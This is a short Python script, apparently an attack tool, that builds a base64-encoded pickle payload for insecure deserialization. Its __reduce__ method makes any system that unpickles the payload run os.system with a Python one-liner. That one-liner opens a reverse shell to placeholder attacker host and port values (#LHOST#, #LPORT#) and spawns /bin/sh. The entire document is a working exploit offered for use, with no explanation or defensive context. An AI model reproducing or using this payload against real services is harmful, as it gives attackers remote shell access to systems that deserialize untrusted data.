import os, base64, pickle

class Exploit(object):
	def __reduce__(self):
		cmd = """
python3 -c	'
	import socket, os, pty;
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
	s.connect(("#LHOST#", #LPORT#));
	os.dup2(s.fileno(),0);
	os.dup2(s.fileno(),1);
	os.dup2(s.fileno(),2);
	pty.spawn("/bin/sh");
'
"""
		cmd = cmd.replace('\n', '')
		cmd = cmd.replace('\t', '')
		return (os.system, (cmd,));

def main():
	exploit = Exploit()
	payload = base64.b64encode(pickle.dumps(exploit))
	print(str(payload, 'utf-8'))

if __name__ == '__main__': 
	main()
